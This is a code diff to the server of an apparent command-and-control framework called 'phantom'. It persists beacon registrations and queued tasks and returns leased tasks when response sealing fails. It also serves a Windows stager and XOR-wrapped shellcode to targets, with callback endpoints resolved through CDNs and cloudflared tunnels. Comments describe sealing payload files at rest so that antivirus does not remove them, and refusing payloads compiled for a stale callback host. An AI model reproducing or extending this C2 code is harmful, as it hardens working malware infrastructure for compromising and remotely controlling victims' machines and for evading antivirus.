@@ -269,19 +269,23 @@ class C2State:
             with open(path, "r", encoding="utf-8") as handle:
                 data = json.load(handle)
         except Exception as exc:
+            kept = self._quarantine_state("unreadable")
             logger.warning(f"C2 state unreadable ({exc}): starting with an "
-                           f"empty engagement, the file is kept for "
-                           f"inspection")
+                           f"empty engagement; the file is kept for "
+                           f"inspection at {kept}")
             return False
         if not isinstance(data, dict):
+            kept = self._quarantine_state("not-an-object")
             logger.warning("C2 state is not an object: starting with an empty "
-                           "engagement")
+                           f"engagement; the file is kept at {kept}")
             return False
         version = data.get("version")
         if version != _STATE_VERSION:
+            kept = self._quarantine_state(f"version-{version}")
             logger.warning(
                 f"C2 state version {version!r} != {_STATE_VERSION}: refused "
-                f"rather than interpreted, starting with an empty engagement")
+                f"rather than interpreted, starting with an empty engagement; "
+                f"the file is kept at {kept}")
             return False
 
         def _records(raw: Any, many: bool) -> dict[str, list[dict[str, Any]]]:
@@ -317,6 +321,31 @@ class C2State:
                     f"{sum(len(v) for v in self.results.values())} result(s), "
                     f"auto-shell {'on' if self.auto_shell else 'off'}")
         return True
+
+    def _quarantine_state(self, reason: str) -> str:
+        """Move a state file we refused to read out of the way.
+
+        The log message always said "the file is kept for inspection", and it
+        was not: the NEXT `_persist_state` wrote its temp file and
+        ``os.replace``d it onto the very path the operator was told to go and
+        look at. Renaming first makes the promise true and leaves the rejected
+        engagement readable next to the fresh one.
+
+        Best effort: a rename that fails must not stop the listener from
+        starting, and the returned path says what actually happened.
+        """
+        path = self._state_persist_path
+        if not path or not os.path.exists(path):
+            return path or ""
+        stamp = datetime.now().strftime("%Y%m%d-%H%M%S")
+        target = f"{path}.rejected-{reason}-{stamp}"
+        try:
+            os.replace(path, target)
+            return target
+        except OSError as exc:
+            logger.warning(f"could not set the rejected C2 state aside "
+                           f"({exc}): the next write will overwrite it")
+            return path
 
     def reload(self) -> bool:
         """Load the persisted state, but ONLY into an empty store.
@@ -644,8 +673,11 @@ class C2State:
                 # A REGISTRATION is a state change a restart must not lose:
                 # the beacon is real, its queue is not empty, and every later
                 # report is built from this record. A mere `last_seen` refresh
-                # is NOT (that is what the debounce is for).
-                self._persist_state()
+                # is NOT (that is what the debounce is for). FORCED, because a
+                # registration that lands inside the debounce window only set
+                # `_state_dirty` and nothing ever retried it: two beacons
+                # checking in within 2s and a crash lost the second one.
+                self._persist_state(force=True)
             else:
                 # Session resume: same beacon_id, still alive. If the beacon was
                 # silent for a while, mark the resume so the operator sees the
@@ -693,8 +725,9 @@ class C2State:
             except Exception:
                 pass
             # queued work is exactly what a restart must not lose: a beacon
-            # cannot drain a task nobody remembers issuing.
-            self._persist_state()
+            # cannot drain a task nobody remembers issuing. FORCED: inside the
+            # debounce window this used to only mark the store dirty.
+            self._persist_state(force=True)
             return task_id
 
     def queue_typed_task(self, beacon_id: str,
@@ -724,7 +757,7 @@ class C2State:
                                  capability=task.capability_id, mode="typed")
             except Exception:
                 pass
-            self._persist_state()
+            self._persist_state(force=True)
             return task.task_id
 
     @staticmethod
@@ -746,6 +779,12 @@ class C2State:
         now = datetime.now()
         now_text = now.isoformat(timespec="seconds")
         tasks_to_send: list[dict[str, Any]] = []
+        # Drain a deferred write HERE too: a check-in is the one event that is
+        # guaranteed to keep happening while a beacon is alive, so it bounds
+        # the debounce window instead of leaving `_state_dirty` set until the
+        # process is finally killed.
+        if self._state_dirty:
+            self._persist_state(force=True)
         with self.lock:
             retained: list[dict[str, Any]] = []
             for task in self.tasks.get(beacon_id, []):
@@ -767,6 +806,25 @@ class C2State:
                 })
             self.tasks[beacon_id] = retained
         return tasks_to_send
+
+    def release_lease(self, beacon_id: str, task_ids: list[str]) -> int:
+        """Hand leased tasks back so the next check-in delivers them again.
+
+        Used when the response could not be sealed: without it the batch is
+        invisible to the beacon for ``TASK_LEASE_SECONDS`` while the server
+        has already reported it as delivered.
+        """
+        wanted = {str(t or "") for t in (task_ids or []) if t}
+        if not wanted:
+            return 0
+        released = 0
+        with self.lock:
+            for task in self.tasks.get(beacon_id, []):
+                if str(task.get("task_id", "")) in wanted:
+                    task.pop("_leased_at", None)
+                    task.pop("_sent_at", None)
+                    released += 1
+        return released
 
     def _ack_task_locked(self, beacon_id: str, task_id: str) -> None:
         """Remove one acknowledged task; caller must hold ``self.lock``."""
@@ -1352,9 +1410,18 @@ async def handle_checkin(request: web.Request, pre_body: Optional[str] = None) -
             logger.info("check-in %s: sealed response %d bytes for %d task(s)",
                         beacon_id, len(encrypted_response), len(pending))
         if not encrypted_response:
+            # 200 with an EMPTY body is not "no work": the beacon cannot tell
+            # it from a valid answer, the tasks stay leased for 60s, and the
+            # log line above has already claimed "delivering N task(s)". Fail
+            # loudly and hand the lease back so the next check-in retries.
+            released = c2_state.release_lease(
+                beacon_id, [t.get("task_id", "") for t in pending])
             logger.error("check-in %s: response encryption FAILED "
-                         "(no envelope key for this identity)", beacon_id)
-        elif os.environ.get("PHANTOM_DEBUG_SEALED"):
+                         "(no envelope key for this identity); %d task(s) "
+                         "released, answering 500 so the beacon retries",
+                         beacon_id, released)
+            return web.Response(status=500, text="seal failed")
+        if os.environ.get("PHANTOM_DEBUG_SEALED"):
             try:
                 dbg = os.path.join(os.environ.get("TEMP", "."), "opencode",
                                    "sealed_actual.txt")
@@ -1573,11 +1640,13 @@ async def handle_payload(request: web.Request) -> web.Response:
             if os.path.exists(static_path):
                 filename = "beacon_linux_static"
 
-        if not os.path.exists(payload_path):
+        # The builder seals the plaintext artefacts at rest (they are
+        # content-signatured and an on-access AV removes them on the operator
+        # box). `payload()` reads either form and hands back the SAME bytes.
+        from phantom.utils import beacon_artifacts
+        data = beacon_artifacts.payload(payload_path)
+        if data is None:
             return web.Response(text=f"Payload '{filename}' not compiled yet.", status=404)
-        
-        with open(payload_path, "rb") as f:
-            data = f.read()
 
         # the name the browser saves has to stay RUNNABLE: a PE saved with no
         # extension (or as .mp4) is simply not executable
@@ -1626,12 +1695,55 @@ async def handle_short_stager(request: web.Request) -> web.Response:
             return web.Response(status=403,
                                 text="Forbidden: Invalid auth token")
         from phantom.utils.builder import windows_stager_script
-        host = server_instance.host if server_instance.host != "0.0.0.0" \
-            else request.headers.get("Host", request.url.host)
-        if ":" in host:
-            host = host.split(":")[0]
-        port = server_instance.port or request.url.port or 80
-        use_ssl = request.scheme == "https"
+        # The ENDPOINT THE CLIENT USED, not the endpoint we are bound to.
+        # Behind a front (`c2.front`: a CDN, a redirector, a cloudflared
+        # tunnel) the two are different, and the difference is fatal: the
+        # body served through a tunnel used to say
+        # `http://127.0.0.1:80/x?auth=...` — i.e. the TARGET was told to
+        # download the payload from its own loopback, so a perfectly good
+        # delivery produced no beacon and nothing anywhere said why.
+        #
+        # `Host` carries the public name the client dialled; `X-Forwarded-Proto`
+        # carries the scheme it dialled it with (https at the edge, http to
+        # us). A direct request has neither surprise: Host already includes
+        # the listener's port when it is not the scheme default.
+        authority = request.headers.get("Host", "") or ""
+        host, port = authority, None
+        if authority.startswith("["):                      # [::1]:8443
+            close = authority.find("]")
+            if close > 0:
+                host = authority[:close + 1]
+                tail = authority[close + 1:]
+                if tail.startswith(":") and tail[1:].isdigit():
+                    port = int(tail[1:])
+        elif authority.count(":") == 1:
+            name, _, tail = authority.partition(":")
+            if name and tail.isdigit():
+                host, port = name, int(tail)
+        if not host:
+            host = request.url.host or server_instance.host or "127.0.0.1"
+        forwarded = str(request.headers.get("X-Forwarded-Proto", ""))
+        scheme = forwarded.strip().lower()
+        if scheme not in ("http", "https"):
+            scheme = request.scheme
+        if port is None:
+            # A DIRECT caller carries the real port in its own URL, and its
+            # body must name that port back: served on 8443, the old code
+            # defaulted to 443 and told the target to dial a service that is
+            # not there (the stager fetched fine and the beacon never came).
+            # Behind a front the public port is implicit, so the scheme
+            # default is the only correct answer — and the listener's private
+            # port must never leak into the body.
+            behind_front = bool(
+                str(request.headers.get("X-Forwarded-Proto", "")).strip())
+            own = 0 if behind_front else int(getattr(request.url, "port", 0) or 0)
+            if not own and not behind_front:
+                # last direct source: the listener's own port. If WE are the
+                # thing being dialled, our port is the one the target must
+                # dial back.
+                own = int(getattr(server_instance, "port", 0) or 0)
+            port = own or (443 if scheme == "https" else 80)
+        use_ssl = scheme == "https"
         script = windows_stager_script(host, port, use_ssl=use_ssl)
         if not script:
             logger.error("Short stager: generate_dropper produced no body")
@@ -1642,17 +1754,62 @@ async def handle_short_stager(request: web.Request) -> web.Response:
         return web.Response(status=500)
 
 
+def _stale_payload_endpoint():
+    """``(baked_host, baked_port, live_host, live_port)`` when they disagree.
+
+    The PIC carries its callback endpoint COMPILED IN. Serving a payload that
+    dials somewhere this C2 is not listening is never right, and it fails in
+    the worst possible way: the target runs it, the shellcode dials a dead
+    host (a retired tunnel, a stale LAN address, `127.0.0.1`), and the only
+    visible symptom is a console that stays open while nothing arrives.
+
+    Measured 2026-11-02: the served payload had been compiled at 09:02 with
+    ``C2_HOST "…trycloudflare.com"`` / port 443, while the typed stager
+    fetched from 192.168.1.155:8443 — a whole HID live test read as "the key
+    is broken" for a mismatch a single comparison finds.
+    """
+    try:
+        import phantom as _phantom
+        from phantom.utils.c2_crypto import beacon_config_endpoint
+        from phantom.utils.network import get_c2_endpoint
+        beacon_dir = os.path.join(os.path.dirname(_phantom.__file__),
+                                  "payloads", "beacon")
+        baked = beacon_config_endpoint(beacon_dir)
+        if not baked:
+            return None
+        live_host, live_port = get_c2_endpoint()
+        if (str(baked[0]), int(baked[1])) == (str(live_host), int(live_port)):
+            return None
+        return (str(baked[0]), int(baked[1]), str(live_host), int(live_port))
+    except Exception:
+        return None
+
+
 async def handle_payload_pic(request: web.Request) -> web.Response:
     """GET /x — Serve the authenticated XOR-wrapped PIC payload."""
     try:
         if not _payload_token_ok(request):
             logger.warning(f"Unauthorized PIC payload request from {request.remote}")
             return web.Response(status=403, text="Forbidden: Invalid auth token")
+        stale = _stale_payload_endpoint()
+        if stale:
+            baked_host, baked_port, live_host, live_port = stale
+            logger.error("PIC payload compilato per %s:%s ma questo C2 ascolta "
+                         "su %s:%s — richiesta rifiutata", baked_host,
+                         baked_port, live_host, live_port)
+            return web.Response(
+                status=500,
+                text=(f"Payload compiled for {baked_host}:{baked_port} but "
+                      f"this C2 listens on {live_host}:{live_port} — rebuild "
+                      f"it (`generate windows x64`) before delivering."))
         payload_path = os.path.join(os.path.dirname(__file__), "..", "payloads", "beacon", "beacon_xored.bin")
         if not os.path.exists(payload_path):
             return web.Response(text="Payload not compiled yet.", status=404)
-        with open(payload_path, "rb") as f:
-            data = f.read()
+        # Sealed at rest by the builder: decrypt in memory, never on disk.
+        from phantom.utils import beacon_artifacts
+        data = beacon_artifacts.payload(payload_path)
+        if data is None:
+            return web.Response(text="Payload not compiled yet.", status=404)
         return web.Response(body=data, content_type="application/octet-stream")
     except Exception as e:
         logger.error(f"PIC payload delivery error: {e}")
